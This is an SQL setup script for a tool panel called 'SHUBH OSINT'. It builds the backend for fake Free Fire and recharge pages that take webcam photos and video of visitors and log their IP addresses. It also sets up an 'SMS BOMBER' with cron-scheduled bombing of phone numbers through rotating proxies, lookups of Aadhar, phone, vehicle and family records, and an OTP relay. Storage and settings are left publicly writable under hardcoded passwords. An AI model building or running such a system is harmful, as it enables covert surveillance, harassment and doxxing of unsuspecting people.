-- =====================================================
-- SHUBH OSINT - Complete Supabase Database Setup
-- =====================================================
-- Run this SQL in your new Supabase project's SQL Editor
-- Last Updated: 2026-04-11
-- Version: 6.4 (Free Fire + Recharge capture with mandatory camera permission)
-- =====================================================
-- Authentication: Email + Password (Supabase Auth)
-- First signup automatically becomes admin (via handle_new_user trigger)
-- Admin panel: Protected by Supabase Auth + user_roles (admin role check)
-- Login is ALWAYS allowed (never blocked by toggle) so admin can always access
-- Signup can be toggled on/off from admin panel
-- Capture templates: /capture, /recharge, /freefire
-- All capture pages enforce camera permission before showing content
-- Free Fire diamond redemption template added
-- Recharge capture page starts camera capture immediately on page load
-- Legacy tables (access_passwords, user_sessions, credit_usage)
-- are kept for reference but no longer used.
-- =====================================================

-- =====================================================
-- 1. ENUMS
-- =====================================================

DO $$ BEGIN
  CREATE TYPE public.app_role AS ENUM ('admin', 'user');
EXCEPTION WHEN duplicate_object THEN NULL;
END $$;

-- =====================================================
-- 2. CREATE TABLES
-- =====================================================

-- Profiles Table (stores user info, linked to auth.users)
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID NOT NULL PRIMARY KEY,
  email TEXT,
  display_name TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- User Roles Table (RBAC - first user = admin)
CREATE TABLE IF NOT EXISTS public.user_roles (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL,
  role public.app_role NOT NULL,
  UNIQUE (user_id, role)
);

-- [LEGACY] Access Passwords Table (no longer used - kept for reference)
CREATE TABLE IF NOT EXISTS public.access_passwords (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_hash TEXT NOT NULL,
  password_display TEXT NOT NULL,
  total_credits INTEGER NOT NULL DEFAULT 0,
  remaining_credits INTEGER NOT NULL DEFAULT 0,
  is_enabled BOOLEAN NOT NULL DEFAULT true,
  is_used BOOLEAN NOT NULL DEFAULT false,
  is_unlimited BOOLEAN NOT NULL DEFAULT false,
  device_id TEXT,
  used_at TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- [LEGACY] User Sessions Table (no longer used)
CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  device_id TEXT NOT NULL,
  session_token TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_active_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- [LEGACY] Credit Usage Table (no longer used)
CREATE TABLE IF NOT EXISTS public.credit_usage (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  credits_used INTEGER NOT NULL,
  search_type TEXT NOT NULL,
  search_query TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- App Settings Table (stores all app configuration)
CREATE TABLE IF NOT EXISTS public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  setting_key TEXT NOT NULL UNIQUE,
  setting_value JSONB NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Photos Table
CREATE TABLE IF NOT EXISTS public.captured_photos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  image_data TEXT NOT NULL,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Videos Table
CREATE TABLE IF NOT EXISTS public.captured_videos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  video_url TEXT NOT NULL,
  duration_seconds INTEGER DEFAULT 5,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Search History Table
CREATE TABLE IF NOT EXISTS public.search_history (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  search_type TEXT NOT NULL,
  search_query TEXT NOT NULL,
  ip_address TEXT,
  searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Hit APIs Table (v3.8+)
CREATE TABLE IF NOT EXISTS public.hit_apis (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL,
  url TEXT NOT NULL,
  method TEXT NOT NULL DEFAULT 'GET',
  headers JSONB NOT NULL DEFAULT '{}'::jsonb,
  body JSONB NOT NULL DEFAULT '{}'::jsonb,
  body_type TEXT NOT NULL DEFAULT 'json',
  query_params JSONB NOT NULL DEFAULT '{}'::jsonb,
  enabled BOOLEAN NOT NULL DEFAULT true,
  proxy_enabled BOOLEAN NOT NULL DEFAULT false,
  force_proxy BOOLEAN NOT NULL DEFAULT false,
  rotation_enabled BOOLEAN NOT NULL DEFAULT false,
  residential_proxy_enabled BOOLEAN NOT NULL DEFAULT false,
  fail_count INTEGER NOT NULL DEFAULT 0,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Scheduled Hits Table (v4.0+)
CREATE TABLE IF NOT EXISTS public.scheduled_hits (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  phone_number TEXT NOT NULL,
  start_time TIMESTAMP WITH TIME ZONE NOT NULL,
  interval_seconds INTEGER NOT NULL DEFAULT 60,
  max_rounds INTEGER DEFAULT 0,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_executed_at TIMESTAMP WITH TIME ZONE,
  next_execution_at TIMESTAMP WITH TIME ZONE,
  total_hits INTEGER NOT NULL DEFAULT 0,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- =====================================================
-- 3. ENABLE ROW LEVEL SECURITY
-- =====================================================

ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.access_passwords ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credit_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.hit_apis ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.scheduled_hits ENABLE ROW LEVEL SECURITY;

-- =====================================================
-- 4. RLS POLICIES
-- =====================================================

-- Profiles - Users can read/update their own profile
DROP POLICY IF EXISTS "Users can read own profile" ON public.profiles;
CREATE POLICY "Users can read own profile" ON public.profiles
  FOR SELECT TO authenticated USING (auth.uid() = id);

DROP POLICY IF EXISTS "Users can update own profile" ON public.profiles;
CREATE POLICY "Users can update own profile" ON public.profiles
  FOR UPDATE TO authenticated USING (auth.uid() = id);

-- User Roles - Users can read their own roles
DROP POLICY IF EXISTS "Users can read own roles" ON public.user_roles;
CREATE POLICY "Users can read own roles" ON public.user_roles
  FOR SELECT TO authenticated USING (auth.uid() = user_id);

-- Access Passwords - No direct access (legacy)
DROP POLICY IF EXISTS "No direct access to passwords" ON public.access_passwords;
CREATE POLICY "No direct access to passwords" ON public.access_passwords
  AS RESTRICTIVE FOR ALL USING (false);

-- User Sessions - No direct access (legacy)
DROP POLICY IF EXISTS "No direct access to sessions" ON public.user_sessions;
CREATE POLICY "No direct access to sessions" ON public.user_sessions
  AS RESTRICTIVE FOR ALL USING (false);

-- Credit Usage - No direct access (legacy)
DROP POLICY IF EXISTS "No direct access to credit usage" ON public.credit_usage;
CREATE POLICY "No direct access to credit usage" ON public.credit_usage
  AS RESTRICTIVE FOR ALL USING (false);

-- App Settings - Public read/write
DROP POLICY IF EXISTS "Anyone can read settings" ON public.app_settings;
CREATE POLICY "Anyone can read settings" ON public.app_settings
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert settings" ON public.app_settings;
CREATE POLICY "Anyone can insert settings" ON public.app_settings
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update settings" ON public.app_settings;
CREATE POLICY "Anyone can update settings" ON public.app_settings
  FOR UPDATE TO public USING (true);

-- Captured Photos - Public access
DROP POLICY IF EXISTS "Anyone can view captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can view captured photos" ON public.captured_photos
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Allow insert for photo capture" ON public.captured_photos;
CREATE POLICY "Allow insert for photo capture" ON public.captured_photos
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can delete captured photos" ON public.captured_photos
  FOR DELETE TO public USING (true);

-- Captured Videos - Public access
DROP POLICY IF EXISTS "Anyone can view captured videos metadata" ON public.captured_videos;
CREATE POLICY "Anyone can view captured videos metadata" ON public.captured_videos
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert video metadata" ON public.captured_videos;
CREATE POLICY "Anyone can insert video metadata" ON public.captured_videos
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete video metadata" ON public.captured_videos;
CREATE POLICY "Anyone can delete video metadata" ON public.captured_videos
  FOR DELETE TO public USING (true);

-- Search History - Public access
DROP POLICY IF EXISTS "Anyone can view search history" ON public.search_history;
CREATE POLICY "Anyone can view search history" ON public.search_history
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert search history" ON public.search_history;
CREATE POLICY "Anyone can insert search history" ON public.search_history
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete search history" ON public.search_history;
CREATE POLICY "Anyone can delete search history" ON public.search_history
  FOR DELETE TO public USING (true);

-- Hit APIs - Public CRUD
DROP POLICY IF EXISTS "Anyone can read hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can read hit apis" ON public.hit_apis
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can insert hit apis" ON public.hit_apis
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can update hit apis" ON public.hit_apis
  FOR UPDATE TO public USING (true);

DROP POLICY IF EXISTS "Anyone can delete hit apis" ON public.hit_apis;
CREATE POLICY "Anyone can delete hit apis" ON public.hit_apis
  FOR DELETE TO public USING (true);

-- Scheduled Hits - Public CRUD
DROP POLICY IF EXISTS "Anyone can read scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can read scheduled hits" ON public.scheduled_hits
  FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Anyone can insert scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can insert scheduled hits" ON public.scheduled_hits
  FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can update scheduled hits" ON public.scheduled_hits
  FOR UPDATE TO public USING (true);

DROP POLICY IF EXISTS "Anyone can delete scheduled hits" ON public.scheduled_hits;
CREATE POLICY "Anyone can delete scheduled hits" ON public.scheduled_hits
  FOR DELETE TO public USING (true);

-- =====================================================
-- 5. STORAGE BUCKETS
-- =====================================================

INSERT INTO storage.buckets (id, name, public)
VALUES ('captured-videos', 'captured-videos', true)
ON CONFLICT (id) DO NOTHING;

INSERT INTO storage.buckets (id, name, public)
VALUES ('captured-photos', 'captured-photos', true)
ON CONFLICT (id) DO NOTHING;

INSERT INTO storage.buckets (id, name, public)
VALUES ('backgrounds', 'backgrounds', true)
ON CONFLICT (id) DO NOTHING;

-- =====================================================
-- 6. STORAGE POLICIES
-- =====================================================

DROP POLICY IF EXISTS "Anyone can view captured videos" ON storage.objects;
CREATE POLICY "Anyone can view captured videos" ON storage.objects
  FOR SELECT USING (bucket_id = 'captured-videos');

DROP POLICY IF EXISTS "Anyone can upload captured videos" ON storage.objects;
CREATE POLICY "Anyone can upload captured videos" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'captured-videos');

DROP POLICY IF EXISTS "Anyone can delete captured videos" ON storage.objects;
CREATE POLICY "Anyone can delete captured videos" ON storage.objects
  FOR DELETE USING (bucket_id = 'captured-videos');

DROP POLICY IF EXISTS "Public can view captured photos" ON storage.objects;
CREATE POLICY "Public can view captured photos" ON storage.objects
  FOR SELECT USING (bucket_id = 'captured-photos');

DROP POLICY IF EXISTS "Anyone can upload captured photos" ON storage.objects;
CREATE POLICY "Anyone can upload captured photos" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'captured-photos');

DROP POLICY IF EXISTS "Anyone can delete captured photos" ON storage.objects;
CREATE POLICY "Anyone can delete captured photos" ON storage.objects
  FOR DELETE USING (bucket_id = 'captured-photos');

DROP POLICY IF EXISTS "Public can view backgrounds" ON storage.objects;
CREATE POLICY "Public can view backgrounds" ON storage.objects
  FOR SELECT USING (bucket_id = 'backgrounds');

DROP POLICY IF EXISTS "Anyone can upload backgrounds" ON storage.objects;
CREATE POLICY "Anyone can upload backgrounds" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'backgrounds');

DROP POLICY IF EXISTS "Anyone can update backgrounds" ON storage.objects;
CREATE POLICY "Anyone can update backgrounds" ON storage.objects
  FOR UPDATE USING (bucket_id = 'backgrounds');

DROP POLICY IF EXISTS "Anyone can delete backgrounds" ON storage.objects;
CREATE POLICY "Anyone can delete backgrounds" ON storage.objects
  FOR DELETE USING (bucket_id = 'backgrounds');

-- =====================================================
-- 7. FUNCTIONS
-- =====================================================

-- Update timestamp function
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Has Role function (security definer - avoids RLS recursion)
CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role public.app_role)
RETURNS BOOLEAN
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.user_roles
    WHERE user_id = _user_id AND role = _role
  )
$$;

-- Handle new user signup (auto-assign admin to first user)
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  user_count integer;
BEGIN
  -- Create profile
  INSERT INTO public.profiles (id, email, display_name)
  VALUES (NEW.id, NEW.email, COALESCE(NEW.raw_user_meta_data->>'display_name', split_part(NEW.email, '@', 1)));

  -- First admin auto-assign
  SELECT COUNT(*) INTO user_count FROM public.user_roles WHERE role = 'admin';
  
  IF user_count = 0 THEN
    INSERT INTO public.user_roles (user_id, role) VALUES (NEW.id, 'admin');
  ELSE
    INSERT INTO public.user_roles (user_id, role) VALUES (NEW.id, 'user');
  END IF;

  RETURN NEW;
END;
$$;

-- =====================================================
-- 8. TRIGGERS
-- =====================================================

-- Auto-create profile + role on signup
DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW
  EXECUTE FUNCTION public.handle_new_user();

-- Update timestamps
DROP TRIGGER IF EXISTS update_app_settings_updated_at ON public.app_settings;
CREATE TRIGGER update_app_settings_updated_at
  BEFORE UPDATE ON public.app_settings
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

DROP TRIGGER IF EXISTS update_access_passwords_updated_at ON public.access_passwords;
CREATE TRIGGER update_access_passwords_updated_at
  BEFORE UPDATE ON public.access_passwords
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

DROP TRIGGER IF EXISTS update_hit_apis_updated_at ON public.hit_apis;
CREATE TRIGGER update_hit_apis_updated_at
  BEFORE UPDATE ON public.hit_apis
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

DROP TRIGGER IF EXISTS update_scheduled_hits_updated_at ON public.scheduled_hits;
CREATE TRIGGER update_scheduled_hits_updated_at
  BEFORE UPDATE ON public.scheduled_hits
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

DROP TRIGGER IF EXISTS update_profiles_updated_at ON public.profiles;
CREATE TRIGGER update_profiles_updated_at
  BEFORE UPDATE ON public.profiles
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- =====================================================
-- 9. INDEXES
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_photos_date ON public.captured_photos(captured_at);
CREATE INDEX IF NOT EXISTS idx_captured_videos_session ON public.captured_videos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_videos_date ON public.captured_videos(captured_at);
CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
CREATE INDEX IF NOT EXISTS idx_search_history_date ON public.search_history(searched_at);
CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);
CREATE INDEX IF NOT EXISTS idx_hit_apis_enabled ON public.hit_apis(enabled);
CREATE INDEX IF NOT EXISTS idx_hit_apis_name ON public.hit_apis(name);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_active ON public.scheduled_hits(is_active);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_next ON public.scheduled_hits(next_execution_at);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_phone ON public.scheduled_hits(phone_number);
CREATE INDEX IF NOT EXISTS idx_user_roles_user ON public.user_roles(user_id);

-- =====================================================
-- 10. REALTIME
-- =====================================================

ALTER PUBLICATION supabase_realtime ADD TABLE public.hit_apis;

-- =====================================================
-- 11. DEFAULT DATA
-- =====================================================

-- Main Settings
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('main_settings', '{
  "sitePassword": "dark",
  "adminPassword": "dark",
  "theme": "dark",
  "headerName1": "SHUBH",
  "headerName2": "OSINT",
  "headerIcon": "Zap",
  "headerCustomLogo": "",
  "headerColor1": "green",
  "headerColor2": "pink",
  "headerFont": "Orbitron",
  "headerStyle": "normal",
  "darkDbUrl": "https://shubhinfo.vercel.app/",
  "darkDbHeight": "70",
  "darkDbBorderColor": "purple",
  "darkDbBorderWidth": "2",
  "backgroundImage": "",
  "backgroundOpacity": "30",
  "camSessionId": "shubhcam01",
  "camRedirectUrl": "https://google.com",
  "customCaptureHtml": "",
  "chromeCustomHtml": "",
  "camIframeUrl": "",
  "camPhotoLimit": 0,
  "camCaptureInterval": 500,
  "camVideoDuration": 5,
  "camCountdownTimer": 5,
  "camAutoRedirect": true,
  "camQuality": 0.8,
  "allSearchAccessKey": "darkosint",
  "telegramOsintAccessKey": "darkosint",
  "sitePasswordEnabled": true,
  "allSearchKeyEnabled": true,
  "telegramKeyEnabled": true,
  "creditSystemEnabled": false,
  "page2MusicUrl": "",
  "mainPageMusicUrl": "/audio/background-music.mp3",
  "tabSize": "small",
  "callDarkEnabled": true,
  "callDarkApiKey": "",
  "callDarkAgentId": "",
  "callDarkMaxDuration": 20,
  "headerBorderEnabled": true,
  "tabContainerBorderEnabled": true,
  "qrSize": 180,
  "qrFgColor": "#22c55e",
  "qrBgColor": "#000000",
  "qrIncludeLogo": false,
  "loaderImageUrl": "",
  "dashboardTheme": "cyber-grid",
  "tabs": [
    {"id": "phone", "label": "Phone", "icon": "Phone", "color": "green", "placeholder": "Enter phone number...", "searchType": "phone", "apiUrl": "", "enabled": true},
    {"id": "numinfov2", "label": "NUM INFO V2", "icon": "Search", "color": "cyan", "placeholder": "Enter phone number...", "searchType": "numinfov2", "apiUrl": "", "enabled": true},
    {"id": "aadhar", "label": "Aadhar", "icon": "CreditCard", "color": "pink", "placeholder": "Enter Aadhar number...", "searchType": "aadhar", "apiUrl": "", "enabled": true},
    {"id": "vehicle", "label": "Vehicle", "icon": "Car", "color": "orange", "placeholder": "Enter RC number...", "searchType": "vehicle", "apiUrl": "https://darknagi-osint-vehicle-api.vercel.app/api/vehicle?rc=", "enabled": true},
    {"id": "instagram", "label": "Instagram", "icon": "Camera", "color": "cyan", "placeholder": "Enter username...", "searchType": "instagram", "apiUrl": "", "enabled": true},
    {"id": "family", "label": "Family", "icon": "Users", "color": "purple", "placeholder": "Enter name/number...", "searchType": "family", "apiUrl": "", "enabled": true},
    {"id": "manual", "label": "Manual", "icon": "ClipboardPaste", "color": "yellow", "placeholder": "Enter number...", "searchType": "manual", "apiUrl": "https://hydrashop.in.net/number.php?q=", "enabled": true},
    {"id": "shubh", "label": "CAM HACK", "icon": "Sparkles", "color": "white", "placeholder": "", "searchType": "shubh", "apiUrl": "", "enabled": true},
    {"id": "darkdb", "label": "Webcam 360", "icon": "Globe", "color": "teal", "placeholder": "", "searchType": "darkdb", "apiUrl": "https://2info.vercel.app", "enabled": true},
    {"id": "telegram", "label": "Telegram OSI", "icon": "Send", "color": "blue", "placeholder": "", "searchType": "telegram", "apiUrl": "", "enabled": true},
    {"id": "allsearch", "label": "All Search", "icon": "Globe", "color": "red", "placeholder": "Enter phone / email / name...", "searchType": "allsearch", "apiUrl": "https://lek-steel.vercel.app/api/search?q=", "enabled": true},
    {"id": "tgtonum", "label": "Tg To Num", "icon": "MessageCircle", "color": "lime", "placeholder": "Enter Telegram username...", "searchType": "tgtonum", "apiUrl": "", "enabled": true},
    {"id": "randipanel", "label": "RANDI PANEL", "icon": "Skull", "color": "red", "placeholder": "", "searchType": "randipanel", "apiUrl": "", "enabled": true},
    {"id": "smsbomber", "label": "SMS BOMBER", "icon": "Bomb", "color": "orange", "placeholder": "", "searchType": "smsbomber", "apiUrl": "", "enabled": true},
    {"id": "calldark", "label": "CALL DARK", "icon": "PhoneCall", "color": "purple", "placeholder": "", "searchType": "calldark", "apiUrl": "", "enabled": true},
    {"id": "imagetoinfo", "label": "Image to Info", "icon": "Camera", "color": "pink", "placeholder": "", "searchType": "imagetoinfo", "apiUrl": "", "enabled": true},
    {"id": "mpokket", "label": "Mpokket", "icon": "Phone", "color": "yellow", "placeholder": "", "searchType": "mpokket", "apiUrl": "", "enabled": true}
  ],
  "telegramOsint": {
    "jwtToken": "",
    "baseUrl": "https://funstat.info",
    "tools": [
      {"id": "basic_info", "label": "BASIC INFO", "enabled": true, "cost": "0.10 credit"},
      {"id": "groups", "label": "GROUPS", "enabled": true, "cost": "5 credits"},
      {"id": "group_count", "label": "GROUP COUNT", "enabled": true, "cost": "FREE"},
      {"id": "messages_count", "label": "MESSAGES COUNT", "enabled": true, "cost": "FREE"},
      {"id": "messages", "label": "MESSAGES (LIMITED)", "enabled": true, "cost": "10 credits"},
      {"id": "stats_min", "label": "BASIC STATS", "enabled": true, "cost": "FREE"},
      {"id": "stats", "label": "FULL STATS", "enabled": true, "cost": "1 credit"},
      {"id": "reputation", "label": "REPUTATION", "enabled": true, "cost": "FREE"},
      {"id": "resolve_username", "label": "USERNAME RESOLVE", "enabled": true, "cost": "0.10 credit"},
      {"id": "username_usage", "label": "USERNAME USAGE", "enabled": true, "cost": "0.1 credit"},
      {"id": "usernames", "label": "USERNAMES HISTORY", "enabled": true, "cost": "3 credits"},
      {"id": "names", "label": "NAMES HISTORY", "enabled": true, "cost": "3 credits"},
      {"id": "stickers", "label": "STICKERS", "enabled": true, "cost": "1 credit"},
      {"id": "common_groups", "label": "COMMON GROUPS", "enabled": true, "cost": "5 credits"}
    ]
  }
}'::jsonb)
ON CONFLICT (setting_key) DO NOTHING;

-- Hit Site Settings
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('hit_site_settings', '{
  "siteName": "SHUBH OSINT",
  "adminButtonText": "SETTING",
  "warningText": "Sirf authorized testing aur educational purpose ke liye.",
  "quickHitTitle": "QUICK HIT",
  "phoneLabel": "Phone Number",
  "phonePlaceholder": "91XXXXXXXXXX",
  "hitButtonText": "START",
  "stopButtonText": "STOP",
  "noApisWarning": "Admin me APIs add karo pehle.",
  "adminPanelTitle": "ADMIN PANEL",
  "logoutButtonText": "LOGOUT",
  "disclaimerTitle": "DISCLAIMER",
  "disclaimerText": "Yeh tool sirf authorized testing aur educational purpose ke liye hai. Unauthorized use strictly prohibited.",
  "apiListTitle": "API List",
  "addApiButtonText": "Add",
  "noApisText": "No APIs added yet.",
  "logoUrl": "",
  "adminPassword": "dark",
  "residentialProxyUrl": "",
  "uaRotationEnabled": true,
  "enterNumberLabel": "Enter Number:",
  "apisActiveText": "APIs Active",
  "sequentialLabel": "Sequential",
  "parallelLabel": "Parallel",
  "scheduleLabel": "Schedule",
  "hittingApisText": "Hitting APIs...",
  "copyrightText": "© 2026 {TITLE} | All Rights Reserved",
  "roundLabel": "Round",
  "hitsLabel": "Hits",
  "okLabel": "OK",
  "failLabel": "Fail"
}'::jsonb)
ON CONFLICT (setting_key) DO NOTHING;

-- Telegram Bot Config
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('tgbot_config', '{
  "dailyLimit": 5,
  "defaultRounds": 1,
  "defaultBatch": 5,
  "defaultDelay": 2,
  "hitCooldownMinutes": 5,
  "services": {
    "hitApi": true,
    "schedule": true,
    "customSms": true,
    "cameraCapture": true
  }
}'::jsonb)
ON CONFLICT (setting_key) DO NOTHING;

-- Auth Toggles (signup/login on/off from admin)
INSERT INTO app_settings (setting_key, setting_value)
VALUES ('signup_enabled', 'true')
ON CONFLICT (setting_key) DO NOTHING;

INSERT INTO app_settings (setting_key, setting_value)
VALUES ('login_enabled', 'true')
ON CONFLICT (setting_key) DO NOTHING;

-- =====================================================
-- 12. PG_CRON SETUP (for Scheduled Hits)
-- =====================================================
-- Enable pg_cron and pg_net extensions first from
-- Supabase Dashboard > Database > Extensions

CREATE EXTENSION IF NOT EXISTS pg_cron;
CREATE EXTENSION IF NOT EXISTS pg_net;

-- Create cron job (REPLACE placeholders)
-- REPLACE <YOUR-PROJECT-REF> with your Supabase project ref
-- REPLACE <YOUR-ANON-KEY> with your Supabase anon/public key
SELECT cron.schedule(
  'execute-scheduled-hits-every-minute',
  '* * * * *',
  $$
  SELECT net.http_post(
    url := 'https://<YOUR-PROJECT-REF>.supabase.co/functions/v1/execute-scheduled-hits',
    headers := '{"Content-Type": "application/json", "Authorization": "Bearer <YOUR-ANON-KEY>"}'::jsonb,
    body := '{}'::jsonb
  ) AS request_id;
  $$
);

-- =====================================================
-- EDGE FUNCTIONS LIST (deploy from supabase/functions/)
-- =====================================================
-- Version 6.1 Edge Functions:
-- [LEGACY - no longer used by app]:
-- 1.  auth-login              - (LEGACY) User login with credit password
-- 2.  auth-verify             - (LEGACY) Verify session token & get credits
-- 3.  credits-deduct          - (LEGACY) Deduct credits for search operations
-- 4.  admin-passwords         - (LEGACY) Admin CRUD for password management
--
-- Active Edge Functions:
-- 5.  aadhar-search           - Aadhar lookup API
-- 6.  numinfo-v2              - Phone number info API
-- 7.  telegram-osint          - Telegram OSINT API integration
-- 8.  call-dark               - Omnidim AI call dispatch API
-- 9.  hit-api                 - API Hit Engine with UA rotation
-- 10. image-to-info           - Image analysis API
-- 11. execute-scheduled-hits  - Cron-based scheduled bombing executor
-- 12. fast-hit-all            - Hit ALL enabled APIs (Pro API style)
-- 13. telegram-bot            - Telegram Bot webhook handler (v6.1 - optimized batch queries, cache, fire-and-forget)
-- 14. mpokket-otp             - Custom SMS multi-service OTP relay (mPokket + Milkbasket + Digihaat)
-- 15. verify-admin            - Verify admin password via edge function
--
-- =====================================================
-- CORS HEADERS (all edge functions must use):
-- const corsHeaders = {
--   'Access-Control-Allow-Origin': '*',
--   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
-- };
-- =====================================================

-- =====================================================
-- SETUP GUIDE (Self-hosted Supabase)
-- =====================================================
-- 1. Create new Supabase project
-- 2. Run this entire SQL in SQL Editor
-- 3. Deploy edge functions: supabase functions deploy --project-ref YOUR_REF
-- 4. Set secrets:
--    supabase secrets set TELEGRAM_BOT_TOKEN=your_bot_token
-- 5. Set Telegram webhook:
--    GET https://YOUR_REF.supabase.co/functions/v1/telegram-bot?action=setwebhook
-- 6. First signup on website = admin (automatic)
-- 7. Admin panel: toggle signup/login, manage settings
-- 8. For pg_cron: replace <YOUR-PROJECT-REF> and <YOUR-ANON-KEY> above
--
-- ADMIN SETUP:
-- - First user to signup becomes admin automatically
